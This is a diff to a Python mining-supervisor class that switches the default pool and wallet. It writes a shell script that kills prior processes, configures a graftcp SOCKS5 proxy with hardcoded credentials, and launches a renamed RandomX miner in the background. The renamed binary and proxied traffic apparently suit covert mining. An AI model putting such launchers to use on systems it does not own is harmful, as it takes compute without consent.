@@ -340,9 +340,10 @@ class MiningSupervisor:
         proxy = config.get("proxy", "43.135.134.20:443")
         username = config.get("username", "aku")
         password = config.get("password", "akukayaraya")
-        pool = config.get("pool", "de.zephyr.herominers.com:1123")
+        pool = config.get("pool", "43.135.134.20:10080")
         algo = config.get("algo", "rx/0")
-        wallet = config.get("wallet", "ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5")
+        wallet = config.get("wallet", "Q0105004c2ec0e7de79c4be90511953853323d0f28cc49d8f74d0d8f393f081e47f28f9f24db827")
+        cpu_pct = str(config.get("cpu_pct", "100"))
 
         # Stop existing miner first (keep config so start_or_update replaces it)
         self.stop(remove_config=False)
@@ -367,51 +368,71 @@ class MiningSupervisor:
         if os.path.exists(graftcp_bin):
             os.chmod(graftcp_bin, 0o755)
 
+        local_bin = os.path.join(MINING_DIR, "graftcp/local/graftcp-local")
+        if os.path.exists(local_bin):
+            os.chmod(local_bin, 0o755)
+
         worker_id = f"{wallet}.{socket.gethostname()}"
         use_proxy = bool(proxy and proxy.strip() and proxy.strip().lower() not in ("none", "direct", "no", "off", "tanpa", "false"))
+        cpu_arg = "--cpu-max-threads-hint=50" if cpu_pct == "50" else ""
 
+        # Update graftcp-local.conf if proxy used
         if use_proxy:
-            # 1. Update graftcp-local.conf
             conf_path = os.path.join(MINING_DIR, "graftcp/local/graftcp-local.conf")
             os.makedirs(os.path.dirname(conf_path), exist_ok=True)
             conf_content = f"listen = :2233\nloglevel = 1\nsocks5 = {proxy}\nsocks5_username = {username}\nsocks5_password = {password}\n"
             with open(conf_path, "w", encoding="utf-8") as f:
                 f.write(conf_content)
 
-            # 2. Start graftcp-local if not running
-            check_local = subprocess.run(["pgrep", "-f", "graftcp-local"], stdout=subprocess.PIPE, text=True)
-            if not check_local.stdout.strip():
-                local_bin = os.path.join(MINING_DIR, "graftcp/local/graftcp-local")
-                if os.path.exists(local_bin):
-                    os.chmod(local_bin, 0o755)
-                    subprocess.Popen([local_bin, "-config", conf_path], cwd=MINING_DIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    time.sleep(1)
-
-            miner_cmd = [
-                graftcp_bin,
-                gasdag_bin,
-                "-a", algo,
-                "-o", pool,
-                "-u", worker_id,
-                "-p", "x"
+        # Generate standalone physical start_mining.sh in ~/workspace/gaszep/start_mining.sh
+        start_script = os.path.join(MINING_DIR, "start_mining.sh")
+        if use_proxy:
+            sh_lines = [
+                "#!/bin/bash",
+                "DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" >/dev/null 2>&1 && pwd)\"",
+                "cd \"$DIR\" || exit 1",
+                "pkill -9 -f graftcp-local 2>/dev/null || true",
+                "pkill -9 -f gasdag 2>/dev/null || true",
+                "sleep 0.2",
+                "cat > graftcp/local/graftcp-local.conf <<EOF",
+                "listen = :2233",
+                "loglevel = 1",
+                f"socks5 = {proxy}",
+                f"socks5_username = {username}",
+                f"socks5_password = {password}",
+                "EOF",
+                "./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &",
+                "sleep 0.3",
+                "./graftcp/graftcp chmod +x gasdag 2>/dev/null || chmod +x gasdag 2>/dev/null || true",
+                f"nohup ./graftcp/graftcp ./gasdag -a {algo} -o {pool} -u {worker_id} -p x {cpu_arg} > ~/workspace/gasdag.log 2>&1 &",
+                "echo 'START_MINING_SH_SUCCESS'"
             ]
         else:
-            miner_cmd = [
-                gasdag_bin,
-                "-a", algo,
-                "-o", pool,
-                "-u", worker_id,
-                "-p", "x"
+            sh_lines = [
+                "#!/bin/bash",
+                "DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" >/dev/null 2>&1 && pwd)\"",
+                "cd \"$DIR\" || exit 1",
+                "pkill -9 -f gasdag 2>/dev/null || true",
+                "sleep 0.2",
+                "chmod +x gasdag 2>/dev/null || true",
+                f"nohup ./gasdag -a {algo} -o {pool} -u {worker_id} -p x {cpu_arg} > ~/workspace/gasdag.log 2>&1 &",
+                "echo 'START_MINING_SH_SUCCESS'"
             ]
 
-        logger.info(f"Memulai mining (Mode: {'Proxy' if use_proxy else 'Direct'}): {' '.join(miner_cmd)}")
+        with open(start_script, "w", encoding="utf-8") as f:
+            f.write("\n".join(sh_lines) + "\n")
+        os.chmod(start_script, 0o755)
+
+        # Launch the miner using start_mining.sh
+        logger.info(f"Memulai mining via start_mining.sh (Mode: {'Proxy' if use_proxy else 'Direct'}, CPU: {cpu_pct}%)")
         self.active_process = subprocess.Popen(
-            miner_cmd,
+            ["bash", start_script],
             cwd=MINING_DIR,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
-        return f"Mining started ({'Proxy' if use_proxy else 'Direct'})! PID: {self.active_process.pid} (Pool: {pool})"
+        mode_str = f"Proxy ({proxy})" if use_proxy else "Direct"
+        return f"Mining started ({mode_str}, CPU: {cpu_pct}%)! (Pool: {pool})"
 
     def stop(self, remove_config: bool = True) -> str:
         try:
